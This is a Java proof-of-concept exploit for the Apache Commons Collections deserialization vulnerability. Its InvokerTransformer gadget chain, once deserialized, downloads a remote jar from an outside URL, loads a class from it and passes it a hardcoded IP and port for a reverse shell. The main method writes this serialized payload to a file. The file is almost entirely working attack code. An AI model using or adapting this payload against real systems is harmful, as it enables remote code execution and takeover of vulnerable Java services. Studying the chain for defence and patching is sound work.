package ApacheCommonsCollections;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
/**
 * code from https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/
 */
public class TransformedMapPoC {
	public static Object Reverse_Payload(String ip, int port) throws Exception {
		final Transformer[] transforms = new Transformer[] {
				new ConstantTransformer(java.net.URLClassLoader.class),
				// getConstructor class.class classname
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[] { java.net.URL[].class } }),
				// newinstance string http://www.iswin.org/attach/iswin.jar
				new InvokerTransformer(
						"newInstance",
						new Class[] { Object[].class },
						new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
								"http://www.iswin.org/attach/iswin.jar") } } }),
				// loadClass String.class R
				new InvokerTransformer("loadClass",
						new Class[] { String.class }, new Object[] { "R" }),
				// set the target reverse ip and port
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[] { String.class } }),
				// invoke
				new InvokerTransformer("newInstance",
						new Class[] { Object[].class },
						new Object[] { new String[] { ip + ":" + port } }),
				new ConstantTransformer(1) };
		Transformer transformerChain = new ChainedTransformer(transforms);
		Map innermap = new HashMap();
		innermap.put("value", "value");
		Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
		Class cls = Class
				.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(Retention.class, outmap);
		return instance;
	}
	public static void main(String[] args) throws Exception {
		GeneratePayload(Reverse_Payload("146.185.182.237", 8090),
				"/Users/iswin/Downloads/test.bin");
	}
	public static void GeneratePayload(Object instance, String file)
			throws Exception {
		File f = new File(file);
		ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
		out.writeObject(instance);
		out.flush();
		out.close();
	}
	public static void payloadTest(String file) throws Exception {
		// 这里为测试上面的tansform是否会触发payload
		// Map.Entry onlyElement =(Entry) outmap.entrySet().iterator().next();
		// onlyElement.setValue("foobar");
		
		ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
		in.readObject();
		in.close();
	}
}